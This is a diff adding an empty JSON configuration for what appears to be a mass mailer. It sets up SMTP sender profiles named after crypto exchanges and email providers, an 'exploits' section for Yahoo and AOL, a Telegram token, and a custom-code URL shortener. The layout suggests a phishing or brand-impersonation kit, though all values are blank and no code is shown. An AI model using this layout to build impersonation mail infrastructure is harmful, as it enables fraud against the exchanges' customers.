@@ -1,0 +1,96 @@
+{
+     "smtp": {
+          "coinbase": {
+               "server": " ",
+               "port": 587,
+               "username": " ",
+               "password": " ",
+               "usage_count": 0
+          },
+          "gmail": {
+               "server": " ",
+               "port": 587,
+               "username": " ",
+               "password": " ",
+               "usage_count": 0
+          },
+          "kraken": {
+               "server": " ",
+               "port": 587,
+               "username": " ",
+               "password": " ",
+               "usage_count": 0
+          },
+          "icloud": {
+               "server": " ",
+               "port": 587,
+               "username": " ",
+               "password": " ",
+               "usage_count": 0
+          },
+          "binance": {
+               "server": " ",
+               "port": 587,
+               "username": " ",
+               "password": " ",
+               "usage_count": 0
+          }
+     },
+     "exploits": {
+          "yahoo": " ",
+          "aol": " "
+     },
+     "sender_ids": {
+          "coinbase": {
+               "status": "online"
+          },
+          "gmail": {
+               "status": "online"
+          },
+          "kraken": {
+               "status": "online"
+          },
+          "icloud": {
+               "status": "offline"
+          },
+          "binance": {
+               "status": "offline"
+          }
+     },
+     "telegram": {
+          "token": " "
+     },
+     "logging": {
+          "enabled": true,
+          "log_file": "logs/mailer.log",
+          "log_level": "INFO"
+     },
+     "url_shortener": {
+          "domain": " ",
+          "host": " ",
+          "port": 80,
+          "https": true,
+          "ssl_certfile": "database/certs/cert.pem",
+          "ssl_keyfile": "database/certs/key.pem",
+          "redirect_http": true,
+          "allow_custom_codes": true,
+          "storage": {
+               "mode": "file",
+               "file_path": "database/storage/urls.json",
+               "sqlite_path": "database/storage/urls.db"
+          },
+          "dns": {
+               "provider": " ",
+               "record_type": " ",
+               "root_domain": " ",
+               "subdomain": " ",
+               "target_ip": " ",  
+               "ttl": 300,
+               "cf_api_key": " "
+          },
+          "rate_limit": {
+               "enabled": true,
+               "RPM": 30
+          }
+     }
+}
